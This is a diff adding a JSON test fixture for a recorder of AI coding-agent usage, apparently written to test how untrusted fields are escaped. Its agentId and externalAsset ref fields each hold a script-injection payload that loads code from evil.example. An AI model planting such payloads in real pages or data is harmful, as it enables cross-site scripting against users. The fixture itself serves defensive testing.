@@ -1,0 +1,44 @@
+{
+  "schemaVersion": "1.0.0",
+  "kind": "captured",
+  "fidelity": "per-request",
+  "recordId": "79278cc131952ef31887dba55add49dca4f05b7b7bf8e278e3cb4b58169132ef",
+  "idempotencyKey": "r10-hostile-child",
+  "provenance": {
+    "cli": "claude-code",
+    "cliVersion": "1.0.0",
+    "captureChannel": "test-fixture",
+    "formatFingerprint": "sha256:00000000000000000000000000000000"
+  },
+  "identity": {
+    "sessionId": "sess-hostile-child",
+    "parentSessionId": "sess-parent",
+    "agentId": "</script><script src=\"https://evil.example/x.js\"><!--     &amp;",
+    "projectRoot": "/home/agent/SENTINEL-PROJECT-ROOT-51d2"
+  },
+  "timing": {
+    "requestInstant": "2026-10-05T13:00:00.000Z",
+    "captureInstant": "2026-10-05T13:00:00.000Z"
+  },
+  "modelId": "claude-sonnet-5",
+  "interaction": "user-turn",
+  "tokens": {
+    "netInput": 5,
+    "cacheRead": 0,
+    "cacheWrite": 0,
+    "output": 1,
+    "reasoning": 0
+  },
+  "raw": {
+    "vendor": "test-fixture",
+    "usage": {},
+    "transcriptExcerpt": "SENTINEL-CONVERSATION-TEXT-7f3a9c"
+  },
+  "rawStatus": "complete",
+  "attribution": {
+    "externalAsset": {
+      "kind": "github-issue",
+      "ref": "</script><script src=\"https://evil.example/x.js\"><!--     &amp;"
+    }
+  }
+}
